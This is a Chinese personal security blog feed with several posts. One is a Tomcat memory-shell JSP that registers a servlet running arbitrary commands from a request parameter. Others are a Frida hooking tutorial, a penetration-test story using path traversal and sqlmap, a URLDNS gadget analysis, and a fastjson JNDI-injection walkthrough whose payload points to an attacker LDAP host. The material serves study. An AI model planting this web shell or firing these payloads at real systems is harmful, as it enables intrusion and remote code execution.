task = request1.getParameter(<span class="hljs-string">&quot;taskdilng&quot;</span>);<br>        <span class="hljs-keyword">if</span> (task != <span class="hljs-literal">null</span>)&#123;<br>          <span class="hljs-comment">// Process aa = Runtime.getRuntime().exec(task);</span><br>           InputStream fis = <span class="hljs-keyword">new</span> ProcessBuilder(task).start().getInputStream();<br>          <span class="hljs-comment">// response1.setContentType(&quot;text/html&quot;);</span><br>          <span class="hljs-comment">// PrintWriter out = response1.getWriter();</span><br>            <span class="hljs-comment">// System.out.println(&quot;res: &quot;+aa);</span><br>          <span class="hljs-comment">//InputStream fis=aa.getInputStream();</span><br>        InputStreamReader isr=<span class="hljs-keyword">new</span> InputStreamReader(fis);<br>        BufferedReader br=<span class="hljs-keyword">new</span> BufferedReader(isr);<br>        <span class="hljs-built_in">String</span> line=<span class="hljs-literal">null</span>;<br>        <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">(line=br.readLine())!=<span class="hljs-literal">null</span></span>)</span> &#123;<br>           response.getWriter().println(<span class="hljs-string">&quot;res: &quot;</span>+line);<br>       &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            response1.sendError(HttpServletResponse.SC_NOT_FOUND);<br>        &#125;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;%<br>ServletContext servletContext =  request.getSession().getServletContext();<br>Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); <br>Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); <br>InitTaskServlet initServlet = <span class="hljs-keyword">new</span> InitTaskServlet();<br>org.apache.catalina.Wrapper inittWrapper = standardContext.createWrapper();<br>inittWrapper.setName(<span class="hljs-string">&quot;inittPage&quot;</span>);<br>inittWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>inittWrapper.setServlet(initServlet);<br>inittWrapper.setServletClass(initServlet.getClass().getName());<br>standardContext.addChild(inittWrapper);<br>standardContext.addServletMapping(<span class="hljs-string">&quot;/dulingTask&quot;</span>, <span class="hljs-string">&quot;inittPage&quot;</span>);<br>out.println(<span class="hljs-string">&quot;susscess&quot;</span>);<br>%&gt;<br><br></code></pre></div></td></tr></table></figure><p><img src="/images/61/1.png"></p><p>参考：<br><a href="https://zhishihezi.net/endpoint/richtext/ee17639b01e93049c3a9a905fc5f3ef6?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00d32ed62f491eb19720c09f60240236b865f263b27d3ce9d77d52456202bd9cd61d91548955020fd9d5d5fb70e3f63803eb795cb478da798c8323c0082bade42e6d7bec42ef1ae867dce342aa91ff6cba62b2908d1752e9c8cbc3847570d74f209e2b895568eec6218010fcd658dfe07db1ab25b01e7bc9332172b616df45144019458902427a01e56b81bff82c6e8c5e6151338c933b22a46376bdae1a833dfda8070406fd198836fbddc5f36ebc70b34f5185de264334598282d82cbfdd3053#2" title="JAVA本地命令执行-ProcessBuilder命令执行">JAVA本地命令执行-ProcessBuilder命令执行</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模拟器里frida的简单学习</title>
    <link href="/2021/08/15/60/"/>
    <url>/2021/08/15/60/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Frida安装"><a href="#一、Frida安装" class="headerlink" title="一、Frida安装"></a>一、Frida安装</h1><p>pip install frida<br>pip install frida-tools<br><img src="/images/60/1.png"></p><p>模拟器使用雷电模拟器，下载对应内核架构版本frida-server安装到模拟器<br><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br><img src="/images/60/2.png"><br>我的是i686对应的是32位所以下载32位的版本（也可以开启模拟器使用adb shell进去后执行<code>cat /proc/cpuinfo</code>查看版本，看不到就下载一个检测硬件的检测）<br><img src="/images/60/3.png"><br>下载完后解压，执行命令将文件移到手机里<br><code>adb push 解压目录 /data/local/tmp/</code><br><img src="/images/60/4.png"><br>然后adb shell连接手机，依次执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">su <span class="hljs-comment">#执行特权</span><br><span class="hljs-built_in">cd</span> /data/<span class="hljs-built_in">local</span>/tmp/ <span class="hljs-comment">#进入到frida-server文件目录</span><br>ls <span class="hljs-comment">#查看你的frida-server文件叫啥以方便执行</span><br>chmod 777 frida-server <span class="hljs-comment">#给文件读写执行权限</span><br></code></pre></div></td></tr></table></figure><p><img src="/images/60/5.png"><br><code>./frida-server #开启frida-server</code><br><img src="/images/60/6.png"><br>查看是否成功：另起一个cmd，转发端口<br><code>adb forward tcp:27042 tcp:27042</code><br><img src="/images/60/7.png"><br>执行<code>frida-ps -R</code>就会列出设备里的所有进程，代表frida已经部署成功了<br><img src="/images/60/8.png"></p><h1 id="二、hook测试"><a href="#二、hook测试" class="headerlink" title="二、hook测试"></a>二、hook测试</h1><p>模拟器安装一个测试app运行<br><img src="/images/60/9.png"><br>运行python脚本得到android手机当前最前端Activity所在的进程（最新运行的app的进程）：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br>rdev = frida.get_remote_device()<br>front_app = rdev.get_frontmost_application()<br><span class="hljs-built_in">print</span> (front_app)<br>````<br>![](/images/<span class="hljs-number">60</span>/<span class="hljs-number">10.</span>png)<br><br>枚举所有进程：<br>```python<br><span class="hljs-keyword">import</span> frida<br>rdev = frida.get_remote_device()<br>processes = rdev.enumerate_processes()<br><span class="hljs-keyword">for</span> process <span class="hljs-keyword">in</span> processes:<br><span class="hljs-built_in">print</span> (process)<br></code></pre></div></td></tr></table></figure><p><img src="/images/60/11.png"><br>hook android的java层函数，开始尝试劫持：<br>原app（点击按钮提示“source string！”）<br><img src="/images/60/12.png"><br>运行脚本劫持内容：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> frida  <span class="hljs-comment">#导入frida模块</span><br><span class="hljs-keyword">import</span> sys    <span class="hljs-comment">#导入sys模块</span><br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Java.perform(function()&#123;  </span><br><span class="hljs-string">        var MainActivity = Java.use(&#x27;com.example.testfrida.MainActivity&#x27;);</span><br><span class="hljs-string">        MainActivity.testFrida.implementation = function()&#123;</span><br><span class="hljs-string">            send(&#x27;Statr! Hook!&#x27;);</span><br><span class="hljs-string">            return &#x27;Change String!&#x27; #劫持点，点击按钮后要改变的内容</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_message</span>(<span class="hljs-params">message,data</span>):</span> <span class="hljs-comment">#js中执行send函数后要回调的函数</span><br>    print(message)<br><br>process = frida.get_remote_device().attach(<span class="hljs-string">&#x27;testfrida&#x27;</span>) <span class="hljs-comment">#得到设备并劫持进程com.example.testfrida</span><br>script = process.create_script(jscode) <span class="hljs-comment">#创建js脚本</span><br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>,on_message) <span class="hljs-comment">#加载回调函数，也就是js中执行send函数规定要执行的python函数</span><br>script.load() <span class="hljs-comment">#加载脚本</span><br>sys.stdin.read()<br></code></pre></div></td></tr></table></figure><p><img src="/images/60/13.png"><br>其中jscode为js实现，具体看官方文档<br><a href="https://frida.re/docs/quickstart/">https://frida.re/docs/quickstart/</a></p><p>以后每次启动都要执行</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">adb shell <span class="hljs-string">&quot;cd /data/local/tmp&amp;&amp;ls&amp;&amp;./frida-server&quot;</span><br>adb forward tcp:27042 tcp:27042<br></code></pre></div></td></tr></table></figure><h1 id="hook密钥"><a href="#hook密钥" class="headerlink" title="hook密钥"></a>hook密钥</h1><p>推荐工具inspeckage</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://www.jianshu.com/p/9731185d33aa">https://www.jianshu.com/p/9731185d33aa</a></p><p>[2] <a href="https://blog.csdn.net/qq_38851536/article/details/103755407?utm_medium=distribute.pc_relevant.none-task-blog-title-6&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_38851536/article/details/103755407?utm_medium=distribute.pc_relevant.none-task-blog-title-6&amp;spm=1001.2101.3001.4242</a></p><p>[3] <a href="https://www.anquanke.com/post/id/86567">https://www.anquanke.com/post/id/86567</a></p><p>[4] <a href="https://www.52pojie.cn/thread-1128884-1-1.html">https://www.52pojie.cn/thread-1128884-1-1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>安卓测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安卓测试</tag>
      
      <tag>frida</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重新整理了一下图床</title>
    <link href="/2021/07/02/58/"/>
    <url>/2021/07/02/58/</url>
    
    <content type="html"><![CDATA[<p>闲来无事翻了一下以前的博客发现图片不显示了，估计外链挂了，废了九牛二虎之力把原来的图片找回来放github上终于显示回来</p>]]></content>
    
    
    <categories>
      
      <category>生活杂事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活琐事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我是个没用的安服仔</title>
    <link href="/2021/06/25/56/"/>
    <url>/2021/06/25/56/</url>
    
    <content type="html"><![CDATA[<h1 id="接到一个任务"><a href="#接到一个任务" class="headerlink" title="接到一个任务"></a>接到一个任务</h1><p>两个目标：某一线市教育局跟某500强集团两个主站，要求是要getshell，主站get不了就去找归属资产get也行</p><h2 id="先看教育局"><a href="#先看教育局" class="headerlink" title="先看教育局"></a>先看教育局</h2><p>主站一通乱点全被waf拦截了，主站收集了站点上出现的所有下属的资产<br><img src="/images/56/1.png"><br>发现在同一个ip段，猜测可能整个段都是他家的，直接扫c段看到一堆开了web服务的，丢给我的富婆扫一下<br><img src="/images/56/2.png"><br>偶尔出现几个tomcat页面几个swagger接口但是利用不了，弱口令进去几个代码仓库管理系统但是找不到getshell的点，有个jumpserver堡垒机但是漏洞不存在，用域名证书查子域也啥都没有，旁站全是其他gov，不敢动，偶尔出现几个个人站点，但是有的wp5.7.2没发现什么插件，有的是dzx3.4没搞头，fofa也没发现什么能利用的，教育局先拉闸</p><h2 id="转到某集团"><a href="#转到某集团" class="headerlink" title="转到某集团"></a>转到某集团</h2><p>老规矩收集资产，把能点的都点了，没有可以利用的点，ping一下发现上了知道创宇的cdn，fofa搜一下集团名字，筛选一下出现700多个结果。但是没有会员只能看第一页（卑微），发现全是集团的国外品牌vpn登录页<br><img src="/images/56/3.png"><br>搜了一圈没有这个vpn牌子的漏洞，拉闸<br>整理一下得到的东西<br><img src="/images/56/4.png"><br>在供应商平台发现可以注册，注册的时候上传营业执照有个上传漏洞<br><img src="/images/56/5.png"><br>虎躯一震，感觉有救<br>但是最后发现目录不解析，文件重命名，只能传个html，拉闸<br><img src="/images/56/6.png"><br>扫这个ip的端口开放情况，最后根据端口情况对一些登录做爆破，拉闸，子域名拉闸，找到一个过期的域名，拉闸</p><h2 id="发现资产"><a href="#发现资产" class="headerlink" title="发现资产"></a>发现资产</h2><p>继续闲逛集团官网,在关于集团处看到了<br><img src="/images/56/7.png"><br>再次虎躯一震，马上去搜一下<code>第一家公司</code>的情况，得到三个域名<br><img src="/images/56/8.png"><br>主站一通乱点拉闸，fofa搜了一下发现这个公司下面有一个支付平台而且可以注册商户，但是跟上一个上传漏洞类似，拉闸，扫端口发现有一个自研商城系统，但是注册功能异常，注入xss全被waf拦了，爆破拉闸，放弃直接去看<code>第二家公司</code>，一通操作得到几个资产<br><img src="/images/56/9.png"><br>测到一半发现没有什么可以利用的点，眼看资产就要测没了，心已经凉了一半，但是当我眼角瞄到可以注册的时候又开始感觉有救，一通操作下来结合代码审计的经验感觉下载处后端会这么写<br>/uploadfiles/2018/02/{$filepath}<br>试了一下发现下载处的确可以用../穿越目录进行文件访问<br>比如从下载目录到首页<br><img src="/images/56/10.png"><br><img src="/images/56/11.png"><br>但是访问config的后缀文件就会被拒绝，穿越系统目录也会被限制，拉闸，权限被限制的死死的，<br>考虑到是aspx，尝试找找注入，在首页各种功能点一遍，看到一处可疑的url /xx/xx/list_1.aspx，根据以往代码审计的经验感觉这里后端会这样写：list_{$id}.aspx，尝试一下，waf拦截了<br><img src="/images/56/12.png"><br>双重编码可以绕过，但是后端只解一次<br><img src="/images/56/13.png"><br>从报错信息猜测是云空间之类的，站长之家搜一下同ip网站<br><img src="/images/56/14.png"><br>旁站3个，但是没有利用的点，端口扫了一下没看到有什么面板<br>找万能的群友看看有没有什么姿势<br><img src="/images/56/15.png"><br>考虑到时间紧迫不想再爆破了</p><h2 id="转折点"><a href="#转折点" class="headerlink" title="转折点"></a>转折点</h2><p>身体开始颤抖了，抽烟，冷静，还有最后一个扫出来的子域名asp站，打开，点击产品列表，愣住<br><img src="/images/56/16.png"><br>好家伙，sql注入靶场都没你这么明显，凭借年仅20岁但是有30年工作经验的我感觉这里就是有注入，直接上sqlmap<br><img src="/images/56/17.png"><br><img src="/images/56/18.png"></p><h2 id="继续转折"><a href="#继续转折" class="headerlink" title="继续转折"></a>继续转折</h2><p>因为过于兴奋导致精神错乱之下没注意看数据库类型，只想到之前的报错里的绝对路径，赶紧试一下os shell，结果<br><img src="/images/56/19.png"><br>冷静下来终于看到了dbms：microsoft access<br><img src="/images/56/20.png"></p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>注入shell不了那就登录后台shell吧，但是刚跑完表时间到了要上报了，罢了，这么菜getshell不了sql注入总得报一下吧<br><img src="/images/56/22.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3一些问题</title>
    <link href="/2021/06/09/59/"/>
    <url>/2021/06/09/59/</url>
    
    <content type="html"><![CDATA[<p>编码：<br>头部加</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>que库：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Queue <span class="hljs-keyword">import</span> Queue<br></code></pre></div></td></tr></table></figure><p>提示没有Queue，安装<br><img src="/images/59/1.png"><br>install的时候老是报这个错误，百度的都不能解决问题（涉及到技术问题的百度都是垃圾），其实不是网络问题，改一下小写就可以了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ysoserial URLDNS  gadget分析笔记</title>
    <link href="/2021/05/19/55/"/>
    <url>/2021/05/19/55/</url>
    
    <content type="html"><![CDATA[<p>首先查看给出的gadget chain<br><img src="/images/55/1.png"><br>因为反序列化时如果被反序列化的类里实现了Serializable接口且有readObject的话就会执行该方法里的实现，所以跟进readObject，<br> <img src="/images/55/2.png"><br>重写反序列化，计算流的字节，然后使用putval方法来处理HashMap.hash()方法处理key返回的结果<br><img src="/images/55/3.png"><br>跟进hash，在该方法中对传来的参数做了一次判断，当key不为空时调用到key.hashCode<br><img src="/images/55/4.png"><br>因为key是前面传过来的对象u<br><img src="/images/55/5.png"><br>所以根据URLDNS类得知实际为URL类中的hashcode方法<br><img src="/images/55/6.png"><br>在该方法中做了一次判断，当hashcode的值为-1时就进入到handler.hashCode，在URLStreamHandler.hashCode中做了发起dns的请求的操作，具体为：<br><img src="/images/55/7.png"><br>参数传入了getHostAddress，在该方法里将u.getHost的值传进getByName，u.getHost即传来的参数url：<br><img src="/images/55/9.png"><br><img src="/images/55/10.png"><br>最后使用InetAddress.getByName(host)获取主机名，也就是在这里发出了dnslog请求<br><img src="/images/55/8.png"></p><h2 id="关于put方法的思考"><a href="#关于put方法的思考" class="headerlink" title="关于put方法的思考"></a>关于put方法的思考</h2><p>put方法里也会用到hash，说明生成的时候会触发，反序列化也会触发？</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ysoserial</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson1.2.24反序列化jndi注入利用调试跟进</title>
    <link href="/2021/03/11/57/"/>
    <url>/2021/03/11/57/</url>
    
    <content type="html"><![CDATA[<p>一直对jndi注入只有个大概的认识，今天学习一下原理，从fj反序列化漏洞入手调试学习<br>Payload</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.43.147:1389/o=reference&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>前面参数传递省略，分两个部分跟进</p><h1 id="0x01-Fastjson反序列化实现流程跟进"><a href="#0x01-Fastjson反序列化实现流程跟进" class="headerlink" title="0x01.Fastjson反序列化实现流程跟进"></a>0x01.Fastjson反序列化实现流程跟进</h1><p><img src="/images/57/1.png"><br>当参数第一个字符为<code>&#123;</code>时进入<code>case 12</code><br><img src="/images/57/2.png"><br>跟进<code>DefaultJSONParser.parseObject</code><br>随后判断参数如果{的后面是双引号，就使用<code>scanSymbol</code>方法获取双引号里的内容<br><img src="/images/57/3.png"><br>跟进<code>JSONLexerBase.scanSymbol</code><br>开始获取双引号里的内容，扫描传来的值获取key<br><img src="/images/57/4.png"><br><img src="/images/57/5.png"><br><code>Key</code>为<code>@type</code><br><img src="/images/57/6.png"><br>回到<code>JSONLexerBase.scanSymbol</code><br>具体为计算长度，根据长度来获取对应位置的字符，在<code>JSONScanner.next</code>方法中index为双引号开始部分，经过不断遍历，此时index为7，也就是扫描从双引号开始第7位字符的符号，<br><img src="/images/57/7.png"><br>再次得到双引号，符合条件跳出循环<br><img src="/images/57/8.png"><br>最终拿到双引号里的<code>@type</code>符合条件后进入下一步<br><img src="/images/57/9.png"><br>开始扫描下一个双引号里的字符<br><img src="/images/57/10.png"><br>经过像上一步一样的操作最终得到<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="/images/57/11.png"><br>返回上一层进入下一步<br><img src="/images/57/12.png"><br>此处为取得一些基础类，进入<code>loadclass</code>方法<br><img src="/images/57/13.png"><br>mappings是当前类加载器的缓存（相当于是一个容器，classname是key，根据key从容器取出class对象），此处想要从缓存里取出<code>com.sun.rowset.JdbcRowSetImpl</code>，但是<code>mappings</code>不存在这个对象<br><img src="/images/57/14.png"><br>所以开始下一步的判断，从获取到的<code>ClassName</code>看到第一位字符为c，所以绕过第一个及第二个if进入到try<br><img src="/images/57/15.png"><br><code>Classloader</code>为空不满足条件，继续下一个<code>try</code><br><img src="/images/57/16.png"><br>将<code>com.sun.rowset.JdbcRowSetImpl</code>一系列操作后缓存到<code>mappings</code>里，此时<code>clazz</code>为<code>com.sun.rowset.JdbcRowSetImpl</code>，满足前面<code>clazz</code>不为空的条件<br><img src="/images/57/17.png"><br><img src="/images/57/18.png"><br><img src="/images/57/19.png"><br>即<br><img src="/images/57/20.png"><br>然后通过<code>getDeserializer</code>方法得到clazz对象所有参数<br><img src="/images/57/21.png"><br>跟进<code>getDeserializer</code>往下走<br>在<code>getFieId</code>方法里会使用到反射加载的方式来获取对象的<code>set</code>、<code>get</code>方法<br><img src="/images/57/22.png"><br>获取完对象后开始反序列化<br><img src="/images/57/23.png"></p><h2 id="总结流程为："><a href="#总结流程为：" class="headerlink" title="总结流程为："></a>总结流程为：</h2><p>遍历传入的json，取出对应的内容（对象、对象参数）-&gt;获取取出的对象的所有set、get方法-&gt;根据取得的内容做反序列化</p><h1 id="0x02-Jndi注入跟进"><a href="#0x02-Jndi注入跟进" class="headerlink" title="0x02.Jndi注入跟进"></a>0x02.Jndi注入跟进</h1><p>流程走到<br><code>com.sun.rowset.JdbcRowSetImpl#connect</code><br><img src="/images/57/24.png"><br>这里的参数<code>dataSourceName</code>是在前面反序列化时反射加载得到的<code>setter</code>方法<code>setDataSourceName(String name)</code>中设置的，由于可控所以满足jndi注入的条件，此时<code>dataSourceName</code>的值为前面传来的<code>ldap://192.168.43.147:1389/o=reference</code>，再用<code>lookup</code>查找传来的数据源从而进行调用<br>跟进lookup方法看具体实现</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.InitialContext#lookup<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/25.png"><br><code>getURLOrDefaultInitCtx</code>函数会分析传来的<code>name</code>的协议头然后返回对应协议的<code>Context</code>对象子类，然后在对应协议处理对象中去<code>lookup</code>搜索<br>跟进<code>getURLOrDefaultInitCtx </code></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.InitialContext#getURLOrDefaultInitCtx<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/26.png"><br>跟进<code>getURLContext</code>查看对协议的处理</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.NamingManager#getURLContext<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/27.png"><br>此处协议是ldap所以返回<code>GenericURLDirContext</code>对象的子类<code>ldapURLContext</code>，继续跟进<code>lookup</code></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.url.ldap.ldapURLContext#lookup<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/28.png"><br>往上跟到父类的<code>lookup</code></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.toolkit.url.GenericURLContext#lookup<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/29.png"><br>具体链为</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.url.ldap.ldapURLContext#getRootURLContext-&gt; <br>com.sun.jndi.url.ldap.ldapURLContextFactory#getUsingURLIgnoreRootDN-&gt; <br>javax.naming.spi.ResolveResult#ResolveResult-&gt;<br>…<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/30.png"><br>回到<code>lookup</code>方法，<br><img src="/images/57/31.png"><br>调用注册中心的<code>lookup</code>方法去查找传来的<code>name</code>（此处的<code>remainingName</code>即传来的恶意类）<br>流程走到</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.ldap.LdapCtx#c_lookup<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/32.png"><br>获取对象实例，跟进<code>getObjectInstance</code></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.spi.DirectoryManager#getObjectInstance<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/33.png"><br>由于<br><code>javax.naming.spi.NamingManager#getObjectFactoryBuilder</code>的属性为null，所以跳过此处判断<br><img src="/images/57/34.png"><br>回到<code>DirectoryManager</code>类，往下走<br><img src="/images/57/35.png"><br>判断<code>refinfo</code>是否为<code>Reference</code>的实例对象，将恶意类封装到<code>ref</code>中<br>，往下走<br><img src="/images/57/36.png"><br>，获取封装到<code>ref</code>对象的类名，随后到<code>Reference</code>里加载传来的<code>ref</code>，跟进<code>getObjectFactoryFromReference</code>查看具体实现</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.spi.NamingManager#getObjectFactoryFromReference<br></code></pre></div></td></tr></table></figure><p>尝试从本地加载<code>Factory</code>类：<br><img src="/images/57/37.png"><br>如果本地不存在此类，则会从<code>codebase</code>中加载：<br><img src="/images/57/38.png"><br>跟进<code>loadclass</code>方法，</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.naming.internal.VersionHelper<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/39.png"><br>这是一个抽象类，由于抽象类不能被直接实例化，所以我们跟进到他的子类的<code>loadclass</code>方法</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.naming.internal.VersionHelpe12#loadclass<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/40.png"><br>进入到<code>forname</code></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java.lang.class#forname<br></code></pre></div></td></tr></table></figure><p>由于<code>security</code>属性为<code>null</code>所以跳过安全检查直接返回对象<br><img src="/images/57/41.png"><br>回到<code>VersionHelpe12#loadclass</code>，最后通过<code>URLClassLoader</code>从远程动态加载恶意类：<br><img src="/images/57/42.png"><br>此处的<code>getUrlArray</code>方法为父类的解析实现</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">VersionHelper#getUrlArray<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/43.png"><br>回到<code>Javax.naming.spi.NamingManager#getObjectFactoryFromReference</code><br>实例化<code>URLClassLoader</code>从远程动态加载的恶意类，从而加载恶意代码触发命令：<br><img src="/images/57/44.png"><br>实例化调用链如下</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 